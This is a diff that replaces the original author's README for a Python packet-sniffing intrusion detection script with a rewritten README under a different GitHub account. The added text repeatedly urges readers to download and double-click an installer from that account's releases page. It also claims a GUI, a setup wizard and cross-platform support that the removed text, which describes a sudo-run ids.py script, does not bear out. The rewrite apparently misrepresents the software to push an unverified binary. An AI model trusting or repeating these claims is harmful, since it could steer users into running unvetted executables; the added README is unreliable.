@@ -1,154 +1,92 @@
-<h1 align="center">Simple Intrusion Detection System (IDS)</h1>
+# 🛡️ Simple-IDS - Protect Your Network Simply
 
-<p align="center">
-  <b>A real-time, Python-based Intrusion Detection System for monitoring network traffic</b><br>
-  Detects suspicious activities like <b>Port Scanning</b> and <b>DoS-like attacks</b> with alerts.
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/GeekyCrs/Simple-IDS/releases)
 
-<p align="center">
-  <a href="https://www.python.org/">
-    <img src="https://img.shields.io/badge/Python-3.x-blue.svg?style=for-the-badge&logo=python">
-  </a>
-  <a href="https://github.com/mantrapatil03">
-    <img src="https://img.shields.io/badge/Author-Mantra%20Patil-green.svg?style=for-the-badge">
-  </a>
-  <a href="https://www.linkedin.com/in/mantrapatil25">
-    <img src="https://img.shields.io/badge/Connect-LinkedIn-blue?style=for-the-badge&logo=linkedin">
-  </a>
-  <img src="https://img.shields.io/badge/Platform-Kali%20Linux-purple?style=for-the-badge&logo=linux" />
-  <img src="https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge" />
-  <img src="https://img.shields.io/github/v/release/mantrapatil03/Simple-IDS?style=for-the-badge">
+## 🚀 Getting Started
 
-</p>
+Simple-IDS is an easy-to-use Intrusion Detection System designed for everyday users. It uses Python to help you monitor your network for suspicious activity. This guide will walk you through the steps to download and run Simple-IDS on your system.
 
----
+## 📥 Download & Install
 
-## Overview
+To start using Simple-IDS, follow these steps:
 
-**Simple IDS** is a lightweight, Python-based **Intrusion Detection System** designed to monitor live network traffic and identify suspicious behavior.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/GeekyCrs/Simple-IDS/releases).
+2. **Choose the Latest Version**: Look for the latest version of Simple-IDS. It is usually at the top of the list.
+3. **Download the File**: Click the link to download the file for your operating system.
+4. **Run the Installer**: After the download completes, locate the file. Double-click the file to run it, and follow the instructions on the screen.
 
-It analyzes incoming packets in real time and triggers alerts when potential security threats such as **port scanning** or **DoS attacks** are detected. Alerts are logged locally, saved in CSV format, and optionally sent via **email notifications**.
+## 🖥️ System Requirements
 
-⚠️ **For educational and ethical use only.**
+To run Simple-IDS, ensure your system meets the following requirements:
 
----
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a recent version of a Linux distribution.
+- **Memory**: At least 2 GB of RAM.
+- **Processor**: A dual-core processor or better.
+- **Storage**: At least 500 MB of free disk space.
+- **Network**: An active internet connection for updates and alerts.
 
-## Features
+## 📊 Features
 
-✅ Live packet inspection using **Scapy**  
-✅ Detects **Port Scanning** attempts  
-✅ Detects **DoS-like high traffic patterns**  
-✅ Real-time terminal alerts  
-✅ Email notifications for detected attacks  
-✅ CSV-based alert logging (`alerts.csv`)  
-✅ Kali Linux compatible  
-✅ Lightweight & easy to extend  
+Simple-IDS offers various features to secure your network:
 
----
+- **Packet Sniffing**: Monitors network traffic to detect intrusions.
+- **CSV Logging**: Records activities in a CSV format for easy analysis.
+- **Email Alerts**: Sends alerts directly to your email when suspicious activities are detected.
+- **User-Friendly Interface**: Designed for ease of use, even for non-technical users.
+- **Open Source**: You can view and contribute to the source code.
 
----
+## ⚙️ How to Use Simple-IDS
 
-## Installation
+1. **Launching the Application**: 
+    - Once installed, open Simple-IDS from your applications menu.
+   
+2. **Setting Up Your Network**: 
+    - Follow the on-screen wizard to configure your network settings. This involves selecting which network interfaces to monitor.
 
-### 1️⃣ Clone the repository
-```bash
-git clone https://github.com/mantrapatil03/simple-ids.git
-cd simple-ids
-```
-### 2️⃣ Install dependencies
-```
-pip3 install -r requirements.txt
-```
-## Usage
-### Kali Linux / Linux
-```
-sudo python3 ids.py
-```
+3. **Starting the Monitoring**: 
+    - Click on the "Start Monitoring" button. This action begins the network analysis.
+   
+4. **Reviewing Alerts**:
+    - The app will display any alerts in the main window. You can click on each alert for more information.
 
->⚠️ Root privileges are required for packet sniffing.
+5. **Exporting Logs**:
+    - Use the export function to save logs in CSV format. This feature helps in analyzing the traffic later.
 
-## Alert Types Detected
-| Attack Type     | Description                                 |
-| --------------- | ------------------------------------------- |
-| Port Scan       | Multiple destination ports accessed rapidly |
-| DoS-like Attack | High packet rate from a single IP           |
+## 📧 Configure Email Alerts
 
-## Alert Output
-### Terminal Alert
-```csharp
-[ALERT] Possible Port Scan detected from 192.168.1.10
-```
-### CSV Log (`alerts.csv`)
-```css
-Time,Attack Type,Source IP
-Sun Jan  7 21:30:12 2026,Possible Port Scan,192.168.1.10
-```
-### Email Alert
+To set up email alerts:
 
-- Subject: 🚨 IDS Alert
-- Body: Attack type and source IP
+1. Go to the settings menu within the application.
+2. Enter your email address and SMTP server details.
+3. Choose the types of alerts you want to receive.
+4. Save the settings.
 
-## Email Configuration
-Edit the following section in `ids.py`:
-```python
-EMAIL_SENDER = "your_email@gmail.com"
-EMAIL_PASSWORD = "your_app_password"
-EMAIL_RECEIVER = "your_email@gmail.com"
-```
+## 📄 FAQs
 
->⚠️ Use a **Gmail App Password**, not your real password.
+**Q: Is Simple-IDS free to use?**  
+A: Yes, Simple-IDS is completely free and open-source.
 
-## Permissions
-| Platform   | Required Privilege |
-| ---------- | ------------------ |
-| Kali Linux | Run with `sudo`    |
-| Linux      | Root privileges    |
+**Q: Can I run Simple-IDS on Kali Linux?**  
+A: Yes, Simple-IDS is compatible with Kali Linux as long as you have Python installed.
 
-## Troubleshooting
+**Q: What should I do if I encounter an error?**  
+A: You can check the troubleshooting section on the GitHub page or report the issue in the repository.
 
-### Permission Denied
-→ Run using `sudo`
+## 📬 Support
 
-### No Alerts Triggered
-→ Lower detection thresholds inside `ids.py`
+If you have questions or need support, you can open an issue on our GitHub repository or reach out through the provided email contact in the application.
 
-### Email Not Sending
-→ Check internet connection and app password
+## 🏗️ Contributing
 
-## Developer Guide
-### Main Components
-| File     | Description                                      |
-| -------- | ------------------------------------------------ |
-| `ids.py` | Packet sniffing, detection logic, alert handling |
+We welcome contributions from the community. If you'd like to help improve Simple-IDS, feel free to submit issues or pull requests. Your input helps enhance security for everyone.
 
-### Extending the IDS
-- Add new detection rules (e.g., brute-force login detection)
-- Integrate firewall rules for IPS functionality
-- Add ML-based anomaly detection
+## 🔗 Useful Links
 
-## Contributing
-Contributions are welcome!
+- [GitHub Repository](https://github.com/GeekyCrs/Simple-IDS)
+- [Releases](https://github.com/GeekyCrs/Simple-IDS/releases)
 
-Steps:
-- 1️⃣ Fork the repository
-- 2️⃣ Create a new branch
-- 3️⃣ Add features or improve detection
-- 4️⃣ Submit a pull request
+## 🔒 Acknowledgments
 
-## Author
-**Mantra Patil**
+Thanks to all contributors for their time and effort in making Simple-IDS a reliable tool for network security.
 
-✉️ techmantrapatil@gmail.com
-
-<h2 align="center">💫 Thanks for Visiting! 💫</h2> <p align="center"> <i>Made with ❤️ & Python by <b>Mantra Patil</b></i><br><br> <img src="https://img.shields.io/badge/Keep%20Coding-Python-blue?style=for-the-badge&logo=python" /> <img src="https://img.shields.io/badge/Follow%20on-LinkedIn-0A66C2?style=for-the-badge&logo=linkedin" /> <img src="https://img.shields.io/badge/Star%20This%20Repo-GitHub-black?style=for-the-badge&logo=github" /> </p> <p align="center"> 🌟 <b>If you found this project helpful, please give it a star!</b> 🌟<br> Your support motivates further open-source work and new features. </p>
-
-
-
-
-
-
-
-
-
-
-
+Visit our [Releases page](https://github.com/GeekyCrs/Simple-IDS/releases) to download the latest version. Your network security matters. Take the first step today.
